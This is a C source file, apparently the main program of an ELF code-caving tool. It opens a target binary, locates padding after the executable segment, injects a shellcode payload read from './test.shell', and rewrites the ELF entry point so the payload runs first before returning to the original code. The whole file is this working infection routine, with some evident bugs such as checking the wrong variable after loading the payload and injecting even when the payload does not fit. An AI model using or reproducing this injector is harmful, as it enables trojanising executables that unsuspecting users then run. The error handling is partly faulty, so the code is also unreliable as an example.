#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <elf.h>

#include "caving.h"
#include "headers.h"
#include "payload.h"

int swap_entry_point(FILE *binary, int entry_address)
{
    /* Replaces binary entry point with provided address

    */
    int count = 0;
    Elf64_Ehdr header;

    rewind(binary);

    count = fread(&header, sizeof(Elf64_Ehdr), 1, binary);
    if (count <= 0)
    {
        perror("Unable to read binary");
        return 1;
    }
    printf("current entry point: 0x%x\n", header.e_entry);
    printf("changing to : 0x%x\n", entry_address);

    rewind(binary);

    header.e_entry = entry_address;
    count = fwrite(&header, sizeof(Elf64_Ehdr), 1, binary);
    if (count <= 0)
    {
        perror("Unable to write to binary");
        return 1;
    }

    rewind(binary);

    return 0;
}

int main(int argc, char *argv[])
{
    int retval = 0;
    int ph_start = 0; //start address for program headers
    int ph_num = 0;   //program header (ph) count
    int padding = 0;
    int payload_size = 0;
    FILE *binary = NULL;
    Elf64_Phdr exe_ph;
    Elf64_Addr exe_ph_start; //where executable program header begins
    Elf64_Addr entrypoint;
    Elf64_Addr prev_exe_segment_end; //where exe ph ends before modification
    uint8_t *payload = NULL;

    memset(&exe_ph, 0, sizeof(exe_ph));

    if (argc != 2)
    {
        puts("Invalid usage");
        return 1;
    }

    binary = fopen(argv[1], "r+");
    if (NULL == binary)
    {
        perror("Unable to open binary");
        retval = 1;
        return retval;
    }

    retval = get_ph_info(binary, &ph_start, &ph_num, &entrypoint);
    if (retval > 0)
    {
        puts("Failed to find segment size");
        retval = 1;
        goto cleanup;
    }

    exe_ph_start = find_executable_ph(binary, &exe_ph, ph_start, ph_num);
    if (exe_ph_start <= 0)
    {
        puts("Failed to find executable segment");
        goto cleanup;
    }

    printf("Execuatable ph at: 0x%x\n", exe_ph_start);
    printf("Executable segment at: 0x%x\n", exe_ph.p_paddr);

    retval = calculate_padding(binary, exe_ph, &padding);
    if (retval > 0)
    {
        puts("Failed to calculate available padding");
        goto cleanup;
    }

    printf("Padding available: %d bytes\n", padding);

    payload_size = get_payload(&payload, "./test.shell");
    if (retval > 0)
    {
        puts("Failed to load payload");
        goto cleanup;
    }

    retval = stamp_entrypoint(payload, entrypoint);
    if (retval > 0)
    {
        puts("faild to stamp payload with original entrypoint");
        goto cleanup;
    }

    printf("Payload size: %d bytes\n", payload_size);
    if (payload_size < padding)
    {
        puts("payload will fit!");
    }
    else
    {
        puts("not enough room for payload :(");
    }

    printf("Original exe segment size: %d\n", exe_ph.p_filesz);

    prev_exe_segment_end = expand_execuable_segment(binary, exe_ph_start, exe_ph, payload_size); //necessary?
    if (prev_exe_segment_end <= 0)
    {
        puts("Failed to expand executable segment");
        goto cleanup;
    }

    /*retval = expand_fini(binary, payload_size); not needed?
    if (retval > 0)
    {
        puts("Failed to expand ifni section");
        goto cleanup;
    }*/

    printf("Prev segment end: 0x%x\n", prev_exe_segment_end);

    printf("Writing payload to address: 0x%x\n", prev_exe_segment_end);

    retval = inject_payload(binary, prev_exe_segment_end, payload, payload_size);
    if (retval > 0)
    {
        puts("Failed to inject payload");
        goto cleanup;
    }

    retval = swap_entry_point(binary, exe_ph.p_paddr + exe_ph.p_filesz);
    if (retval > 0)
    {
        puts("Failed to swap entry point");
        goto cleanup;
    }

    puts("Successfully overwrote entry point");

cleanup:
    fclose(binary);
    if (payload)
    {
        free(payload);
    }
    return retval;
}
